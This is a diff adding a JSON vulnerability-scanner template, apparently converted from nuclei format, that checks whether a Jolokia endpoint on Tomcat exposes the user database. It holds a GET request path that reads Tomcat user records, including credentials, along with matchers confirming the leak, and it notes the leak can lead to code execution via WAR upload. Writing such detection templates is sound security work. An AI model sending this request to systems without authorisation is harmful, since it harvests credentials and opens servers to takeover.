@@ -1,0 +1,160 @@
+{
+  "id": "jolokia-tomcat-creds-leak",
+  "name": "Jolokia \u003c\u003d 1.7.1 Information Leakage",
+  "author": "pathtaga",
+  "severity": "CRITICAL",
+  "description": "Tomcat\u0027s credential disclosure leading to Remote Code Execution via WAR upload.",
+  "references": [
+    "https://github.com/laluka/jolokia-exploitation-toolkit/blob/main/exploits/info-leak-tomcat-creds.py",
+    "https://therealcoiffeur.github.io/c11011"
+  ],
+  "tags": [
+    "jolokia",
+    "tomcat",
+    "exposure"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {},
+  "variables": {},
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "method": "GET",
+      "path": "{{BaseURL}}/jolokia/read/Users:database\u003dUserDatabase,type\u003dUserDatabase",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "STATUS",
+          "values": [
+            "200"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        },
+        {
+          "type": "WORD",
+          "part": "body",
+          "values": [
+            "\"mbean\":\"Users:database\u003dUserDatabase,type\u003dUserDatabase\"",
+            "\"users\":"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        },
+        {
+          "type": "WORD",
+          "part": "body",
+          "values": [
+            "\"users\":[]"
+          ],
+          "negative": true,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": true,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "jolokia-tomcat-creds-leak",
+    "info": {
+      "name": "Jolokia \u003c\u003d 1.7.1 Information Leakage",
+      "author": "pathtaga",
+      "severity": "critical",
+      "description": "Tomcat\u0027s credential disclosure leading to Remote Code Execution via WAR upload.",
+      "reference": [
+        "https://github.com/laluka/jolokia-exploitation-toolkit/blob/main/exploits/info-leak-tomcat-creds.py",
+        "https://therealcoiffeur.github.io/c11011"
+      ],
+      "tags": "jolokia,tomcat,exposure"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "method": "GET",
+        "redirects": false,
+        "path": [
+          "{{BaseURL}}/jolokia/read/Users:database\u003dUserDatabase,type\u003dUserDatabase",
+          "{{BaseURL}}/actuator/jolokia/read/Users:database\u003dUserDatabase,type\u003dUserDatabase"
+        ],
+        "skip_variables_check": false,
+        "stop_at_first_match": true,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "status",
+            "status": [
+              200
+            ]
+          },
+          {
+            "type": "word",
+            "negative": false,
+            "part": "body",
+            "words": [
+              "\"mbean\":\"Users:database\u003dUserDatabase,type\u003dUserDatabase\"",
+              "\"users\":"
+            ],
+            "condition": "and",
+            "case_insensitive": false
+          },
+          {
+            "type": "word",
+            "negative": true,
+            "part": "body",
+            "words": [
+              "\"users\":[]"
+            ],
+            "case_insensitive": false
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
